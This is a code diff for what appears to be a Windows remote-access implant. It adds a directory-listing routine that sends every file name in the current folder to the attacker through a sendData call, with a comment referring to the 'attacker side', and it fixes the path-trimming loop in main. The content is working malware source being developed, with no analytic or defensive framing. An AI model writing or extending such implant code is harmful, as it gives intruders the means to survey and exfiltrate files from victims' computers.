@@ -122,7 +122,35 @@ void changeDirectory(char* dirName) {
 * TODO - handle optional argument for directory to list contents of
 */
 void listDirectoryContents() {
+	HANDLE findHandle;
+	WIN32_FIND_DATAA fileData;
+	char searchPath[MAX_PATH];
 
+	// build the search path with a simple copy + concat
+	memcpy(searchPath, currDir, MAX_PATH);
+	strcat_s(searchPath, MAX_PATH, "\\*.*");
+	printf("Listing directory contents using search path: %s\n", searchPath);
+
+	// get the first result
+	findHandle = FindFirstFileA(searchPath, &fileData);
+	if (findHandle == INVALID_HANDLE_VALUE) {
+		printf("Error when attempting to find first file: %d\n", GetLastError());
+		return;
+	}
+	sendData(PRINT_INFO, ""); // formatting on attacker side
+
+	// loop through the rest of the files
+	do {
+		sendData(PRINT_INFO, fileData.cFileName);
+	} while (FindNextFileA(findHandle, &fileData));
+
+	// check the exit error code
+	DWORD e = GetLastError();
+	if (e != ERROR_NO_MORE_FILES) {
+		printf("Error when attempting to find next file: %d\n", e); }
+
+	// close the handle and return
+	FindClose(findHandle);
 }
 
 /*
@@ -279,7 +307,7 @@ int main(int argc, char* argv[]) {
 	// get the current directory
 	GetModuleFileNameA(NULL, currDir, MAX_PATH);
 	for (int i = MAX_PATH - 1; i >= 0; i--) {
-		if (currDir[i] != '\\' && currDir[i] != '/') {
+		if (currDir[i] == '\\' || currDir[i] == '/') {
 			currDir[i] = '\0';
 			break;
 		}
